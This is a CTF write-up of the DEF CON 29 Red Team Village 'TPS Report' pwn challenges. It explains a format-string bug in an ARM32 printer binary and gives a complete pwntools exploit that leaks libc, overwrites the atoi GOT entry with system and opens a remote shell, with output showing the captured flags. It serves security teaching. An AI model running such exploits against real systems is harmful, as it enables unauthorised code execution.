# DEF CON 29 Red Team Village Capture the Flag (CTF)

## tps\_report\_[12]


> **TPS Report - 1**
> 
> 50
> 
> Leak the TPS report from memory to obtain the flag.
> 
> **TPS Report - 2**
> 
> 300
> 
> Obtain a shell then run `cat /proc/flag`
> 
> **TPS Report - [12]**
>  
> `nc pwnremote.threatsims.com 9100`
> 
> Download [printer.zip](printer.zip)
>
> Download [arm_libc.so.6](arm_libc.so.6)
>
> zip password: pwnplayground
>
> author: @landhb_

Tags: _pwn_ _arm_ _arm32_ _format-string_ _got-overwrite_ _remote-shell_


## Summary

A bit tricker than your basic format-string GOT overwrite pwn since you cannot simply write locations to the stack.

> No ARM specifics outside of setting up debugging required.  No ARM assembly required.
>
> We'll get both flags with one exploit.


## Analysis

### Checksec

```
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

No PIE, easier ROP (with canary leak).  No PIE/Partial RELRO, easy GOT.
    

### Decompile with Ghidra

```c
int view_jobs(void)
{
  int iVar1;
  int local_10;
  int local_c;
  
  local_10 = 0;
  puts("[*] Current jobs:");
  for (local_c = 0; local_c < 0x1e; local_c = local_c + 1) {
    if ((&job_queue)[local_c * 0x407] != 0) {
      local_10 = local_10 + 1;
      printf("\t%d - %s ",local_c,&DAT_00022088 + local_c * 0x101c);
      printf(&DAT_00023088 + local_c * 0x101c);
      printf(" %ld\n",(&DAT_0002309c)[local_c * 0x407]);
    }
  }
  iVar1 = printf("[*] Displayed %d job(s)\n",local_10);
  return iVar1;
}
```

`printf(&DAT_00023088 + local_c * 0x101c);` is the vulnerability--no format-string.

The parameter to `printf` however is coming from a global and not the stack (local); this is important to understand since this will limit our ability to just write locations to the stack to be used to overwrite the GOT.

That global is set by `create_job`:

```c
  printf("[!] Name of job: ");
  stripped_read(&DAT_00022088 + local_c * 0x101c);
  printf("[!] Path: ");
  stripped_read(&DAT_00023088 + local_c * 0x101c);
```

The `Path` `stripped_read` will accept our exploit(s), however the length is limited by the `fgets` in `stripped_read` to `0x14 - 1` bytes (`fgets` will read one less so that the input can be terminated with a null).  This limitation creates a minor challenge, however `view_jobs` loops through all jobs _only_ calling `printf` enabling us to create multiple short attacks.

With this knowledge in hand, we just need to identify the GOT entry to overwrite:

```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 22

[0x2200c] printf@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22010] fgets@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22014] getchar@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22018] time@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x2201c] __stack_chk_fail@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22020] strcpy@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22024] puts@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22028] __libc_start_main@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x2202c] strerror@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22030] __fxstat@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22034] __gmon_start__ -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22038] open@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x2203c] exit@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22040] strlen@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22044] mmap@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22048] __errno_location@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x2204c] snprintf@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22050] setvbuf@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22054] vfprintf@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22058] fputc@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x2205c] atoi@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
[0x22060] abort@GLIBC_2.4 -> 0x1066c ◂— str    lr, [sp, #-4]!
```

I picked `atoi` since it is used in `main/input` to pick a menu item; after replacing `atoi` with `system` we simply send `/bin/sh` at the menu prompt.

Before identifying the offsets for the format-string exploits, we'll need some tooling.


### Tooling

From `checksec`, `printer` is a 32-bit ARM binary.

The included libc is from Ubuntu 20:

```bash
# strings arm_libc.so.6 | grep 'C Lib'
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.2) stable release version 2.31.
```

Fortunately, I'm using an Ubuntu 20.04 container, all that is required is a few additional packages:

```bash
apt-get -qy install qemu-user libc6-arm64-cross gdb-multiarch libc6-armel-armhf-cross libc6-armhf-cross
```

> `md5sum /usr/arm-linux-gnueabi/lib/libc-2.31.so ./arm_libc.so.6` should be a match.

Install pwndbg (GEF wasn't working for me--well, I did use GEF, however to make this writeup easier to understand I'll be using pwndbg):

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

To debug, first start the binary from terminal session 1:

```bash
qemu-arm -g 9000 -L /usr/arm-linux-gnueabi ./printer
```

Then from terminal session 2:

```bash
cat >script <<'EOF'
file ./printer
set sysroot /usr/arm-linux-gnueabi
b *view_jobs+240
set context-stack-lines 32
target remote localhost:9000
EOF

gdb-multiarch -x script
```

> The breakpoint `*view_jobs+240` is set at the offending `printf`, see above in the Analysis section.


### Analysis continued...

Right, so, launch the two terminal sessions above as described in the Tooling section, and type `c` to continue in gdb, then from the qemu terminal type `1`.

Terminal 1:

```bash
# qemu-arm -g 9000 -L /usr/arm-linux-gnueabi ./printer

	-- Hemidyne Electronic Systems --

[*] Printer and Fax Debug Menu:

    [1] View Current Jobs
    [2] Delete Job
    [3] Create Job
    [4] Display Menu
    [5] Exit

> 1
[*] Current jobs:
	0 - /hemidyne/tps_report.rtf 0xff64b000
```

> The breakpoint was set right after the offending `printf`.

Terminal 2:

```
00:0000│ sp  0xfffef478 ◂— 0x0
01:0004│     0xfffef47c —▸ 0xfffef49c —▸ 0xff64b000 ◂— 0x2020200a ('\n   ')
02:0008│     0xfffef480 ◂— 0x1
03:000c│     0xfffef484 ◂— 0x0
04:0010│     0xfffef488 —▸ 0xfffef4ac —▸ 0xff663744 (__libc_start_main+268) ◂— bl     #0xff67d104 /* 'nf' */
05:0014│ r11 0xfffef48c —▸ 0x110f0 (main+184) ◂— b      #0x11144
06:0018│     0xfffef490 —▸ 0xfffef604 —▸ 0xfffef734 ◂— './printer'
07:001c│     0xfffef494 ◂— 0x1
08:0020│     0xfffef498 —▸ 0x10788 (_start) ◂— mov    fp, #0
09:0024│     0xfffef49c —▸ 0xff64b000 ◂— 0x2020200a ('\n   ')
0a:0028│     0xfffef4a0 ◂— 0x0
0b:002c│     0xfffef4a4 —▸ 0x11168 (__libc_csu_init) ◂— push   {r4, r5, r6, r7, r8, sb, sl, lr}
0c:0030│     0xfffef4a8 ◂— 0x0
0d:0034│     0xfffef4ac —▸ 0xff663744 (__libc_start_main+268) ◂— bl     #0xff67d104 /* 'nf' */
0e:0038│     0xfffef4b0 —▸ 0xff7a1000 ◂— 0x154f10
0f:003c│     0xfffef4b4 —▸ 0xfffef604 —▸ 0xfffef734 ◂— './printer'
```

Above is the stack.  Lines `09`, `0d`, and `0f` are of the most interest.

`09` is the _leak_ mentioned for the first flag, if you look at terminal 1 and at the `view_jobs` code, the pointer to the letter is displayed as `0xff64b000`.  If you know the format-string offset you can simply create a job with a `Path` of `%xx$s` where `xx` is the offset and get the first flag.

`0d` is a libc leak.  We'll need this to get the location of `system`.

`0f` is a pointer to a location down stack that is not too far down (specifically is the _environment_--you can count of this when your format-string is not in stack as a way to get addresses on the stack).

To find the offset, just put in `%10$p` (just a guess) as the `Path` and see what is printed, then match it to the stack; to get started `c` in the gdb session, then create a job, and the view jobs:

```
> 3
[!] Name of job: leak
[!] Path: %10$p
> 1
[*] Current jobs:
	0 - /hemidyne/tps_report.rtf 0xff64b000 1628477598
	1 - leak 0xfffef604
```

> After each line is printed, you'll have a `c` in the debug session to continue.

The `leak` `0xfffef604` we got from passing `10` as the format-string parameter is at line `06` above in the stack dump.  So we just need to add `4` to any line number to compute the offsets.  That puts the letter leak at `13`, the libc leak at `17`, and the pointer we need at `19`.

> If you want to leak that letter now, well go ahead and create a job with `Path` `%13$s`, or just get both flags with the shell.

There's one more offset we need to find and that's what offset `19` points to:

```
0f:003c│     0xfffef4b4 —▸ 0xfffef604 —▸ 0xfffef734 ◂— './printer'
```

To compute:

```
pwndbg> p/d (0xfffef604 - 0xfffef4b4) / 4 + 19
$0 = 103
```

`103` it is.

Analysis complete.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./printer')

if args.REMOTE:
    p = remote('pwnremote.threatsims.com', 9100)
    libc = ELF('./arm_libc.so.6')
else:
    if args.D:
        p = process('qemu-arm -g 9000 -L /usr/arm-linux-gnueabi ./printer'.split())
    else:
        p = process('qemu-arm -L /usr/arm-linux-gnueabi ./printer'.split())
    libc = ELF('/usr/arm-linux-gnueabi/lib/libc-2.31.so')
```

Standard pwntools header.

```python
# leak libc
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'leak')
p.sendlineafter(b'Path: ',b'%17$p')
p.sendlineafter(b'> ',b'1')
p.recvuntil(b'leak ')
_ = p.recvuntil(b' ').split()[0]

libc.address = int(_,16) - 268 - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
```

First we need to leak libc, as mentioned above in the Analysis section the leak is at format-string offset 17 in the stack.


```python
# set msb address for GOT overwrite
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'got')
p.sendlineafter(b'Path: ',b'%' + str(binary.got.atoi + 2).encode() + b'c%19$n')

# overwrite got
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'overwrite')
p.sendlineafter(b'Path: ',b'%' + str(libc.sym.system >> 16).encode() + b'c%103$hn')

# set lsb address for GOT overwrite
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'got')
p.sendlineafter(b'Path: ',b'%' + str(binary.got.atoi).encode() + b'c%19$n')

# overwrite got
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'job: ',b'overwrite')
p.sendlineafter(b'Path: ',b'%' + str(libc.sym.system & 0xffff).encode() + b'c%103$hn')
```

As mentioned in the Analysis section the `fgets` in `stripped_read` is limited to `0x14 - 1` bytes, so we'll have to write this as four different format-string exploits.

The first job will set the address of the most significant two bytes by writing that to offset 19, that is really pointing to 103, so it ends up in 103.  19 has the value of the address we want to write to (read up on how format-string exploits work if you're confused).

The second job then writes out the most significant bytes of `system` to the `atoi` GOT entry.

The 3rd/4th jobs are the same, however for the least significant bytes.

```python
# trigger
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'/bin/sh')

p.interactive()
```

To trigger, just `1` to view the jobs, at the prompt, enter `/bin/sh` to get a shell (now that `atoi` is `system`).


Output (flag2 then flag1):

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/redteamvillagectf2021/tps_report_2/printer'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[+] Opening connection to pwnremote.threatsims.com on port 9100: Done
[*] '/pwd/datajerk/redteamvillagectf2021/tps_report_2/arm_libc.so.6'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0xa71000
[*] Switching to interactive mode
$ cat /proc/flag
TS{TheObstacleIstheWay_WhereIsTheParty}
$ cat /hemidyne/tps_report.rtf

                                     ,σ▒▒φ╓
                                ,╓φ▒╠╬╬╬╬╬╬╬╬▒╦,
                              ▓▓╬╬╬╬╬╬╩╙▓▄▒╬╬╬╬╬╠▒
                              █████╩└'''█████╬╙''.
                           ,  █████▒'''.█████▒''''  ,
                      ,╓φ╬╠╬╬▒╬████▒';╓φ╬████▒';╓φ▒╬╬╬╬▒╦,
                  ,σ▒╬╬╬╬╬╬╬╬╬╬╬╬╬╬▒╠╠╬╬╬╬╬╬╬▒╬╠╬╬╬╬╬╬╬╬╬╬╠▒╦╓
                 ▓█▓▄▒╬╠╩╙└╟█▓▄▒╬╠╩╙╙║██╩╙]██▓▒╬╠╠╩╙░██▓▒╬╬╠╩╙└
                 ▓████▌ '''╟████▌''''▐██▒']█████░..'j█████▒'..'
                 ▓████▌...'╟████▌''''▐██▒']█████░''.j█████▒'''.
                 ▓████▌╓φ▒╠╬╬╬██▌''''  ╙` ]█████░╓φ╬╠╬╬╬██▒''''
                 ▓█████▓▒╬╬╠╩╙╙'''''      ]███████▓▒╬╬╠╩╙└ ''''
                 ╫█████████▌'''.''.'░     '██████████░ .'''.''=
                   └▀▀█████▌''''░"           ╙▀██████░.''!ⁿ"
                        ╙▀█▌""                   ╙▀██░"

        ▓▓▓M 4▓▓▓▄  ]▓▓▓ ]▓▓▓╗▓▓▓▓▓▓▓▓▓⌐▓▓▓▓▓▓▓▓▓⌐ ╓▄▓▓▓▓▓▄µ  ╔▓▓▓   ]▓▓▓
       ]███  █████▌ ▓██▌ ╫███╙╙╙████╙╙╙]███▒╙╙╙╙╙╓███▀╙╙▀███▌ ███▌   ╫███
       ╫███ ╟███╚██████  ███⌐  ]███⌐   ╫████████ ███▌   ,,,, ▐██████████⌐
      .███⌐ ███⌐ ╙████▌ ╟███   ╫███   .████▓▓▓▓▌ ████▓▓████╨ ▓███   ╟███
       ╙╙╙  ╙╙╙   └╙╙╙  ╙╙╙`   ╙╙╙`    ╙╙╙╙╙╙╙╙└   └╙╙╙╙└    ╙╙╙    ╙╙╙`

---------------------------------- TPS REPORT ----------------------------------


Prepared By: Bill Lumbergh                                      Date: 6 Aug 2020

System: Printer

                           TS{tH3hEmiDynEf0rm@tR3p0rT}
```
